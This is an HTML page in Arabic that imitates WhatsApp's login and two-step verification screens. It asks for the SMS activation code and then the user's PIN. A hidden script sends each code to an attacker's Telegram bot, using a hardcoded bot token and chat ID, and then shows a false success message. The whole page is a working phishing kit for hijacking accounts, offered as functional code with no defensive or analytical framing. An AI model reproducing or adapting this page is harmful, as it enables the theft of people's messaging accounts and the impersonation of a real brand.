<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <title>تسجيل الدخول إلى WhatsApp</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FFFFFF;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            height: 100vh;
            text-align: center;
        }

        header {
            width: 100%;
            height: 60px;
            background-color: #25D366;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
            position: fixed;
            top: 0;
        }

        header img {
            width: 40px;
            margin-right: 10px;
        }

        header h1 {
            color: white;
            font-size: 18px;
            margin: 0;
            font-weight: bold;
        }

        .container {
            margin-top: 100px;
            width: 90%;
            max-width: 400px;
            text-align: center;
        }

        h1 {
            font-size: 24px;
            color: #333333;
            margin-bottom: 10px;
        }

        p {
            font-size: 16px;
            color: #666666;
            margin-bottom: 20px;
        }

        .pin-input {
            font-size: 24px;
            letter-spacing: 10px;
            width: calc(1.5em * 6);
            border: none;
            border-bottom: 2px solid #25D366;
            text-align: center;
            margin-bottom: 15px;
            padding: 5px 0;
            outline: none;
            color: #333333;
        }

        .pin-input:focus {
            border-color: #1DA955;
        }

        button {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            color: white;
            background-color: #25D366;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #1DA955;
        }

        .instruction {
            font-size: 14px;
            color: #999999;
            margin-top: 15px;
        }

        .forgot-link {
            color: #25D366;
            font-size: 16px;
            text-decoration: none;
            margin-top: 15px;
            display: inline-block;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        footer {
            width: 100%;
            background-color: #F8F9FA;
            text-align: center;
            padding: 10px 0;
            box-shadow: 0px -2px 5px rgba(0, 0, 0, 0.1);
        }

        footer p {
            font-size: 12px;
            color: #666666;
            margin: 5px 0;
        }

        footer a {
            font-size: 12px;
            color: #25D366;
            text-decoration: none;
        }

        footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <header>
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        <h1>WhatsApp</h1>
    </header>

    <div class="container" id="container">
        <h1>رمز التفعيل</h1>
        <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
        <input id="activationCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
        <button onclick="submitFirstActivationCode()">متابعة</button>
        <div id="countdown"></div>
    </div>

    <footer>
        <p>حقوق النشر © 2024 WhatsApp Inc.</p>
        <a href="#">سياسة الخصوصية</a> | <a href="#">الشروط</a>
    </footer>

    <script>
        function sendCodeToTelegram(code, type) {
            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
            const chatId = '612575358';
            const message = `${type}: ${code}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            }).catch(error => {
                console.error('فشل الاتصال بالخادم:', error);
            });
        }

        function submitFirstActivationCode() {
            const activationCode1 = document.getElementById('activationCode1').value;

            if (!activationCode1 || activationCode1.length !== 6 || !/^\d{6}$/.test(activationCode1)) {
                alert('يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.');
                return;
            }

            sendCodeToTelegram(activationCode1, "رمز التفعيل الأول");

            const container = document.getElementById('container');
            container.innerHTML = `
                <h1>التحقق بخطوتين</h1>
                <p>يرجى إدخال رمز PIN الذي قمت بإعداده مسبقًا أثناء إعداد التحقق بخطوتين.</p>
                <input id="pinCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
                <a href="#" class="forgot-link">نسيت رمز PIN؟</a>
                <p class="instruction">
                    هذا الرمز ليس رمز التفعيل الذي تلقيته، بل رمز PIN الذي قمت بإعداده مسبقًا.
                </p>
                <button onclick="submitPin()">متابعة</button>
            `;
        }

        function submitPin() {
            const pinCode1 = document.getElementById('pinCode1').value;

            if (!pinCode1 || pinCode1.length !== 6 || !/^\d+$/.test(pinCode1)) {
                alert('يرجى إدخال رمز PIN الصحيح.');
                return;
            }

            sendCodeToTelegram(pinCode1, "رمز PIN الأول");
            alert('تم تأكيد الدخول بنجاح!');
        }
    </script>
</body>

</html>
